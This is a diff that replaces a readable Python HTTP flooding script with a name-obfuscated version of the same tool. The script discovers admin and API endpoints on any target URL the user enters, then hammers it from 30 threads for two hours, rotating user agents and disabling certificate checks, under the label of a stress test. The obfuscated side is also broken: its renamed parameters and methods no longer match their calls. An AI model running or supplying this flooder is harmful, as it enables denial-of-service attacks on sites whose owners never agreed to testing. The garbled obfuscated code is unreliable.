@@ -1,215 +1,112 @@
-import requests
-import time
-import json
-import random
-from concurrent.futures import ThreadPoolExecutor
-from requests.exceptions import RequestException
-from urllib3.exceptions import InsecureRequestWarning
+lllllllllllllll, llllllllllllllI, lllllllllllllIl, lllllllllllllII, llllllllllllIll, llllllllllllIlI, llllllllllllIIl = Exception, print, input, range, KeyboardInterrupt, bool, __name__
 
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+from requests.packages.urllib3 import disable_warnings as IIIllllIlllIII
+from random import choice as IlIlllIllIllIl, uniform as IIIIIIIlllllII
+from requests import post as IllIIIIIIIIlll, get as IllllIIlllIIIl, head as lIlIllIIllIIII
+from time import sleep as lIlIllllllIIIl, time as IllIllIIIIIIIl
+from concurrent.futures import ThreadPoolExecutor as lllllIIlIIlIlI
+from requests.exceptions import RequestException as IIIlllIlllllll
+from urllib3.exceptions import InsecureRequestWarning as IlllIIIIIIlIII
+IIIllllIlllIII(IlllIIIIIIlIII)
 
-class BootstrapTester:
-    def __init__(self):
-        self.user_agents = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
-            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
-        ]
-        self.headers = {
-            "Accept": "application/json, text/plain, */*",
-            "Accept-Language": "en-US,en;q=0.9",
-            "Connection": "keep-alive",
-            "Content-Type": "application/json",
-            "X-Requested-With": "XMLHttpRequest"
-        }
-        # Common Bootstrap admin panel and component endpoints
-        self.endpoints = [
-            "admin",
-            "dashboard",
-            "login",
-            "admin/dashboard",
-            "admin/login",
-            "api/v1/auth",
-            "api/v1/users",
-            "api/v1/settings",
-            "components",
-            "assets/js/bootstrap.min.js",
-            "assets/css/bootstrap.min.css",
-            "admin/components",
-            "admin/settings",
-            "admin/users",
-            "admin/profile",
-            "api/auth/login",
-            "api/auth/register"
-        ]
-        self.payloads = {
-            "auth_test": {
-                "username": "admin",
-                "password": "admin123",
-                "remember": True
-            },
-            "component_test": {
-                "type": "modal",
-                "title": "Test Modal",
-                "content": "Test Content",
-                "size": "lg"
-            }
-        }
+class llIIllIIIIlIIllllI:
 
-    def get_random_user_agent(self):
-        return random.choice(self.user_agents)
+    def __init__(lIIlllIIlIIIllIIII):
+        lIIlllIIlIIIllIIII.IllIllllIlIlIlllII = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36']
+        lIIlllIIlIIIllIIII.IllllllIIIIIlIllII = {'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'en-US,en;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest'}
+        lIIlllIIlIIIllIIII.IIIIIIlIlIlllllIll = ['admin', 'dashboard', 'login', 'admin/dashboard', 'admin/login', 'api/v1/auth', 'api/v1/users', 'api/v1/settings', 'components', 'assets/js/bootstrap.min.js', 'assets/css/bootstrap.min.css', 'admin/components', 'admin/settings', 'admin/users', 'admin/profile', 'api/auth/login', 'api/auth/register']
+        lIIlllIIlIIIllIIII.IIlIIllIlIIlIllIII = {'auth_test': {'username': 'admin', 'password': 'admin123', 'remember': llllllllllllIlI(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1)}, 'component_test': {'type': 'modal', 'title': 'Test Modal', 'content': 'Test Content', 'size': 'lg'}}
 
-    def verify_endpoint(self, url, endpoint):
+    def lIllIIlIllIlIIIIlI(lIIlllIIlIIIllIIII):
+        return IlIlllIllIllIl(lIIlllIIlIIIllIIII.IllIllllIlIlIlllII)
+
+    def IIlIllIIIIlllIllIl(lIIlllIIlIIIllIIII, IllIlllIlllIIIlIll, IlIIIllIIlIlIIIlll):
         """Verify endpoint availability before testing"""
-        full_url = f"{url.rstrip('/')}/{endpoint.lstrip('/')}"
+        lllIllIllllIIlIIII = f"{IllIlllIlllIIIlIll.rstrip('/')}/{IlIIIllIIlIlIIIlll.lstrip('/')}"
         try:
-            response = requests.head(
-                full_url,
-                headers={"User-Agent": self.get_random_user_agent()},
-                timeout=3,
-                verify=False,
-                allow_redirects=True
-            )
-            return 200 <= response.status_code < 404
+            llIlIIIIlllllIlIlI = lIlIllIIllIIII(lllIllIllllIIlIIII, headers={'User-Agent': lIIlllIIlIIIllIIII.lIllIIlIllIlIIIIlI()}, timeout=3, verify=llllllllllllIlI(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0), allow_redirects=llllllllllllIlI(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1))
+            return 200 <= llIlIIIIlllllIlIlI.status_code < 404
         except:
-            return False
+            return llllllllllllIlI(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0)
 
-    def discover_valid_endpoints(self, url):
+    def IIllIlIllIIllIIlll(lIIlllIIlIIIllIIII, IllIlllIlllIIIlIll):
         """Discover valid Bootstrap-related endpoints"""
-        print("[INFO] Discovering valid Bootstrap endpoints...")
-        valid_endpoints = []
-        
-        # Add Bootstrap-specific endpoint discovery
-        additional_endpoints = [
-            "css/bootstrap.min.css",
-            "js/bootstrap.min.js",
-            "js/bootstrap.bundle.min.js",
-            "admin/templates",
-            "admin/themes",
-            "admin/plugins",
-            "api/components",
-            "api/themes",
-            "api/templates",
-            "bootstrap",
-            "bootstrap/js",
-            "bootstrap/css",
-            "dist/js/bootstrap.min.js",
-            "dist/css/bootstrap.min.css"
-        ]
-        
-        self.endpoints.extend(additional_endpoints)
-        
-        for endpoint in self.endpoints:
-            if self.verify_endpoint(url, endpoint):
-                print(f"[SUCCESS] Found valid endpoint: {endpoint}")
-                valid_endpoints.append(endpoint)
-        
-        if not valid_endpoints:
-            print("[WARNING] No valid endpoints found. Using default endpoints.")
-            return self.endpoints
-        
-        return valid_endpoints
+        llllllllllllllI('[INFO] Discovering valid Bootstrap endpoints...')
+        lIlIlIIIIIllIlIlII = []
+        llIIlIlIlIIIIlIlII = ['css/bootstrap.min.css', 'js/bootstrap.min.js', 'js/bootstrap.bundle.min.js', 'admin/templates', 'admin/themes', 'admin/plugins', 'api/components', 'api/themes', 'api/templates', 'bootstrap', 'bootstrap/js', 'bootstrap/css', 'dist/js/bootstrap.min.js', 'dist/css/bootstrap.min.css']
+        lIIlllIIlIIIllIIII.IIIIIIlIlIlllllIll.extend(llIIlIlIlIIIIlIlII)
+        for IlIIIllIIlIlIIIlll in lIIlllIIlIIIllIIII.IIIIIIlIlIlllllIll:
+            if lIIlllIIlIIIllIIII.IIlIllIIIIlllIllIl(IllIlllIlllIIIlIll, IlIIIllIIlIlIIIlll):
+                llllllllllllllI(f'[SUCCESS] Found valid endpoint: {IlIIIllIIlIlIIIlll}')
+                lIlIlIIIIIllIlIlII.append(IlIIIllIIlIlIIIlll)
+        if not lIlIlIIIIIllIlIlII:
+            llllllllllllllI('[WARNING] No valid endpoints found. Using default endpoints.')
+            return lIIlllIIlIIIllIIII.IIIIIIlIlIlllllIll
+        return lIlIlIIIIIllIlIlII
 
-    def send_request(self, method, url, endpoint, data=None):
-        full_url = f"{url.rstrip('/')}/{endpoint.lstrip('/')}"
-        self.headers["User-Agent"] = self.get_random_user_agent()
-        
-        # Add Bootstrap-specific headers
-        additional_headers = {
-            "Cache-Control": "no-cache",
-            "Pragma": "no-cache",
-            "Sec-Fetch-Site": "same-origin",
-            "Sec-Fetch-Mode": "cors",
-            "Sec-Fetch-Dest": "empty"
-        }
-        self.headers.update(additional_headers)
-        
+    def lIIlIIIIIllIlIIlII(lIIlllIIlIIIllIIII, lIlIllIllllIIlIlll, IllIlllIlllIIIlIll, IlIIIllIIlIlIIIlll, IlIIlllIllIlIIIIlI=None):
+        lllIllIllllIIlIIII = f"{IllIlllIlllIIIlIll.rstrip('/')}/{IlIIIllIIlIlIIIlll.lstrip('/')}"
+        lIIlllIIlIIIllIIII.IllllllIIIIIlIllII['User-Agent'] = lIIlllIIlIIIllIIII.lIllIIlIllIlIIIIlI()
+        llIlIIIllIlIlIlIll = {'Cache-Control': 'no-cache', 'Pragma': 'no-cache', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty'}
+        lIIlllIIlIIIllIIII.IllllllIIIIIlIllII.update(llIlIIIllIlIlIlIll)
         try:
-            if method.upper() == "GET":
-                response = requests.get(
-                    full_url, 
-                    headers=self.headers, 
-                    timeout=5, 
-                    verify=False,
-                    allow_redirects=True
-                )
+            if lIlIllIllllIIlIlll.upper() == 'GET':
+                llIlIIIIlllllIlIlI = IllllIIlllIIIl(lllIllIllllIIlIIII, headers=lIIlllIIlIIIllIIII.IllllllIIIIIlIllII, timeout=5, verify=llllllllllllIlI(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0), allow_redirects=llllllllllllIlI(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1))
             else:
-                if data:
-                    data["csrf_token"] = self.get_csrf_token(url)
-                
-                response = requests.post(
-                    full_url, 
-                    json=data, 
-                    headers=self.headers, 
-                    timeout=5, 
-                    verify=False,
-                    allow_redirects=True
-                )
-            
-            if response.status_code in [404, 403]:
+                if IlIIlllIllIlIIIIlI:
+                    IlIIlllIllIlIIIIlI['csrf_token'] = lIIlllIIlIIIllIIII.lIllIlllIlIlIIIIII(IllIlllIlllIIIlIll)
+                llIlIIIIlllllIlIlI = IllIIIIIIIIlll(lllIllIllllIIlIIII, json=IlIIlllIllIlIIIIlI, headers=lIIlllIIlIIIllIIII.IllllllIIIIIlIllII, timeout=5, verify=llllllllllllIlI(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0), allow_redirects=llllllllllllIlI(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1))
+            if llIlIIIIlllllIlIlI.status_code in [404, 403]:
                 return None
-            
-            print(f"[{response.status_code}] {method} {full_url}")
-            return response.text if response.ok else None
-        except RequestException as e:
-            print(f"[ERROR] {method} {full_url}: {e}")
+            llllllllllllllI(f'[{llIlIIIIlllllIlIlI.status_code}] {lIlIllIllllIIlIlll} {lllIllIllllIIlIIII}')
+            return llIlIIIIlllllIlIlI.text if llIlIIIIlllllIlIlI.ok else None
+        except IIIlllIlllllll as IlIIlIIIlIIIllIlll:
+            llllllllllllllI(f'[ERROR] {lIlIllIllllIIlIlll} {lllIllIllllIIlIIII}: {IlIIlIIIlIIIllIlll}')
             return None
 
-    def get_csrf_token(self, url):
+    def lIllIlllIlIlIIIIII(lIIlllIIlIIIllIIII, IllIlllIlllIIIlIll):
         """Get CSRF token from the Bootstrap application"""
         try:
-            response = requests.get(
-                f"{url.rstrip('/')}/login",
-                headers={"User-Agent": self.get_random_user_agent()},
-                verify=False
-            )
-            # Implementation for token extraction from response
-            # Token usually found in meta tags or form fields
-            return "dummy_token"  # Replace with actual implementation
+            llIlIIIIlllllIlIlI = IllllIIlllIIIl(f"{IllIlllIlllIIIlIll.rstrip('/')}/login", headers={'User-Agent': lIIlllIIlIIIllIIII.lIllIIlIllIlIIIIlI()}, verify=llllllllllllIlI(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0))
+            return 'dummy_token'
         except:
             return None
 
-    def flood(self, url, workers=10, duration=60):
-        print(f"[INFO] Starting stress test on {url} for {duration}s with {workers} threads")
-        
-        valid_endpoints = self.discover_valid_endpoints(url)
-        if not valid_endpoints:
-            print("[ERROR] No valid endpoints found. Aborting test.")
+    def IIIlIIIlIlllIIllll(lIIlllIIlIIIllIIII, IllIlllIlllIIIlIll, IllIllIIlIIlIIllll=10, lIIIlIlIIlIIlIIlll=60):
+        llllllllllllllI(f'[INFO] Starting stress test on {IllIlllIlllIIIlIll} for {lIIIlIlIIlIIlIIlll}s with {IllIllIIlIIlIIllll} threads')
+        lIlIlIIIIIllIlIlII = lIIlllIIlIIIllIIII.IIllIlIllIIllIIlll(IllIlllIlllIIIlIll)
+        if not lIlIlIIIIIllIlIlII:
+            llllllllllllllI('[ERROR] No valid endpoints found. Aborting test.')
             return
-            
-        self.endpoints = valid_endpoints
-        start_time = time.time()
+        lIIlllIIlIIIllIIII.IIIIIIlIlIlllllIll = lIlIlIIIIIllIlIlII
+        llIIlIlIlIlIlIIIIl = IllIllIIIIIIIl()
 
-        def attack():
-            while time.time() - start_time < duration:
-                endpoint = random.choice(self.endpoints)
-                method = random.choice(["GET", "POST"])
-                payload = self.payloads.get("component_test") if method == "POST" else None
-                result = self.send_request(method, url, endpoint, data=payload)
-                if result:
-                    time.sleep(random.uniform(0.1, 0.3))
+        def IIIIIllllIllIIIlll():
+            while IllIllIIIIIIIl() - llIIlIlIlIlIlIIIIl < lIIIlIlIIlIIlIIlll:
+                IlIIIllIIlIlIIIlll = IlIlllIllIllIl(lIIlllIIlIIIllIIII.IIIIIIlIlIlllllIll)
+                lIlIllIllllIIlIlll = IlIlllIllIllIl(['GET', 'POST'])
+                lIIIlIIIIIIIIIlllI = lIIlllIIlIIIllIIII.IIlIIllIlIIlIllIII.get('component_test') if lIlIllIllllIIlIlll == 'POST' else None
+                llIIIllIlIlllllIlI = lIIlllIIlIIIllIIII.lIIlIIIIIllIlIIlII(lIlIllIllllIIlIlll, IllIlllIlllIIIlIll, IlIIIllIIlIlIIIlll, data=lIIIlIIIIIIIIIlllI)
+                if llIIIllIlIlllllIlI:
+                    lIlIllllllIIIl(IIIIIIIlllllII(0.1, 0.3))
                 else:
-                    time.sleep(random.uniform(0.5, 1.0))
+                    lIlIllllllIIIl(IIIIIIIlllllII(0.5, 1.0))
+        with lllllIIlIIlIlI(max_workers=IllIllIIlIIlIIllll) as IlIllIlIllIlllIIIl:
+            IllIllIllllIIlllIl = [IlIllIlIllIlllIIIl.submit(IIIIIllllIllIIIlll) for lIlIlIllIlllIIlIIl in lllllllllllllII(IllIllIIlIIlIIllll)]
+            for lIllIlIIlIIllllIlI in IllIllIllllIIlllIl:
+                lIllIlIIlIIllllIlI.llIIIllIlIlllllIlI()
 
-        with ThreadPoolExecutor(max_workers=workers) as executor:
-            futures = [executor.submit(attack) for _ in range(workers)]
-            for future in futures:
-                future.result()
-
-def main():
-    target_url = input("Enter target Bootstrap application URL (e.g., https://example.com): ").strip()
-    if not (target_url.startswith("http://") or target_url.startswith("https://")):
-        print("[ERROR] Invalid URL. Please include http:// or https://")
+def IIIIIlllIlIIIIllIl():
+    IlIIIIIIlIlllIIlll = lllllllllllllIl('Enter target Bootstrap application URL (e.g., https://example.com): ').strip()
+    if not (IlIIIIIIlIlllIIlll.startswith('http://') or IlIIIIIIlIlllIIlll.startswith('https://')):
+        llllllllllllllI('[ERROR] Invalid URL. Please include http:// or https://')
         return
-    
     try:
-        tester = BootstrapTester()
-        tester.flood(target_url, workers=30, duration=7200)
-    except KeyboardInterrupt:
-        print("\n[INFO] Test interrupted by user.")
-    except Exception as e:
-        print(f"[ERROR] Unexpected error occurred: {e}")
-
-if __name__ == "__main__":
-    main() 
+        IlIlIIIllIIllllIlI = llIIllIIIIlIIllllI()
+        IlIlIIIllIIllllIlI.IIIlIIIlIlllIIllll(IlIIIIIIlIlllIIlll, workers=30, duration=7200)
+    except llllllllllllIll:
+        llllllllllllllI('\n[INFO] Test interrupted by user.')
+    except lllllllllllllll as IlIIlIIIlIIIllIlll:
+        llllllllllllllI(f'[ERROR] Unexpected error occurred: {IlIIlIIIlIIIllIlll}')
+if llllllllllllIIl == '__main__':
+    IIIIIlllIlIIIIllIl()
